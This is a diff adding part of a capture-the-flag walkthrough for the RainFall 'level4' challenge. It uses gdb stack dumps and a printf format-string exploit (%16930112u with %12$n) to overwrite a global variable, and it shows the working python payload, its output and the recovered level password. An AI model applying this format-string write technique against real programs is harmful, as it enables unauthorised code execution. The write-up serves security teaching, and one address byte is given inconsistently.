@@ -121,3 +121,97 @@ We also need to get the buffer size that is sent to first `fgets` function. We l
 		0xbffff500:	0x41414141	0x41414141	0x41414141	0x41414141
 		0xbffff510:	0x41414141	0x41414141	0x41414141	0x41414141
 		0xbffff520:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff530:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff540:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff550:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff560:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff570:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff580:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff590:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff5a0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff5b0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff5c0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff5d0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff5e0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff600:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff610:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff620:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff630:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff640:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff650:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff6a0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff6b0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x00414141
+		0xbffff6f0:	0xb7fed280	0x00000000	0xbffff708	**0x080484b2**
+		0xbffff700:	0x080484c0	0x00000000	0x00000000	0xb7e454d3
+		0xbffff710:	0x00000001	0xbffff7a4	0xbffff7ac	0xb7fdc858
+		0xbffff720:	0x00000000	0xbffff71c	0xbffff7ac	0x00000000
+		0xbffff730:	0x08048230	0xb7fd0ff4
+
+It is impossible to overwrite buffer because fgets takes definite number of symbols from stdin and all the other leaves there. From the address of the last found letter we substract the beginning of the buffer and get 511 byte + \0 = 512 byte.
+
+	(gdb) p 0xbffff6f0 - 0xbffff4f0
+		$1 = 512
+
+Numbers in hex are transferred to decimal with the help of programming calculator and finally we write the code in C.\
+
+# Exploitation
+
+We can call system and cat the file with password under level4 user if global variable is equal 16930116. Global variable lies in bss under address:
+
+	08049810 <m>:
+		8049810:	00 00                	add    BYTE PTR [eax],al
+
+Or \x10\x98\x04\x08 in little-endian.\
+On this level we deal with format string exploits in `printf(buf)`. It was difficult for understanding.\
+
+String for `printf` lies on the stack and with the help of format string we can look at the stack without gdb:
+
+	level4@RainFall:~$ ./level4
+		AAAABBBBCCCC %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
+		0           1         2        3        4        5        6        7  
+		AAAABBBBCCCC b7ff26b0 bffff754 b7fd0ff4 00000000 00000000 bffff718 0804848d 
+		8        9        10       11       12
+		bffff510 00000200 b7fd1ac0 b7ff37d0 **41414141** 42424242 43434343 38302520
+
+Where our AAA string starts from the **twelth** `printf` argument.\
+In order to come to the 12th argument directly there is a $ opportunity in formatting string.\
+So we can rewrite address of the global variable to the buffer. And then in order to change value of the variable we need to use %n: 
+
+> There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice.
+
+So before %n we need to have 16930116 bytes in the string.
+
+	level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112u" + "%12$n"' > /tmp/lev4
+
+Where functionally:
+
+	- \x10\x98\x04\x08 - address of the global variable
+	- %16930112u - alignment with spaces so that we have necessary number of bytes
+	- "%12$n" that rewrites value of the 12th argument under address that lies in the beginning of the buffer
+
+Where bytes number:
+
+	- \x8c\x98\x04\x08 - 4 bytes
+	- %16930112u - 16930112 spaces, we do not print anything with this printf so there will be only spaces
+
+That equals 16930116 bytes.
+
+It is very difficult to understand it if you do not play with the line and look on gdb.
+
+# Result
+
+	level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112u" + "%12$n"' > /tmp/lev4
+	level4@RainFall:~$ cat /tmp/lev4 - | ./level4
+	                                                                                                                                                                           -1208015184
+	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+	^C
+
+Why do we use `cat -` command? Because even if we break the level and call system, binary is "limited" and can not give us terminal. For that reason we use option of `cat` that helps us to use stdin where shell is called after exploitation.
